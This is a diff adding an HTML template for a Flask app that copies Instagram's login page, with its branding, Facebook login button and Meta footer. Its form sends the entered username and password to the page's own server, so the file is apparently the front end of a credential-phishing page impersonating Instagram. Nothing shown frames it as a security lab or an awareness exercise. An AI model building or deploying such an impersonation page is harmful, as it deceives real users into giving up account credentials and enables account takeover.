@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram Login</title>
+  <!-- Billabong Font (Logo) via CDN -->
+  <link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet" />
+
+  <!-- Roboto Font (Main UI) -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}" />
+
+
+
+</head>
+<body>
+  <div class="container">
+    <div class="phone-preview">
+      <!-- Replace with actual image if needed -->
+      <img src="{{ url_for('static', filename='landing-3x.png') }}" alt="Instagram preview" />
+    </div>
+    <div class="login-box">
+      <img src="{{ url_for('static', filename='instagram-logo.png') }}" alt="Logo" class="logo-img" />
+      <form method="POST">
+  <input type="text" name="username" placeholder="Phone number, username or email address" required />
+  <input type="password" name="password" placeholder="Password" required />
+  <button type="submit">Log in</button>
+</form>
+
+      <div class="divider">OR</div>
+      <button class="fb-login">Log in with Facebook</button>
+      <a href="#" class="forgot">Forgotten your password?</a>
+      <div class="signup">
+        Don't have an account? <a href="#">Sign up</a>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <ul>
+      <li>Meta</li>
+      <li>About</li>
+      <li>Blog</li>
+      <li>Jobs</li>
+      <li>Help</li>
+      <li>API</li>
+      <li>Privacy</li>
+      <li>Terms</li>
+      <li>Locations</li>
+      <li>Instagram Lite</li>
+      <li>Threads</li>
+      <li>Contact uploading and non-users</li>
+      <li>Meta Verified</li>
+    </ul>
+    <p>English (UK) © 2025 Instagram from Meta</p>
+  </footer>
+</body>
+</html>
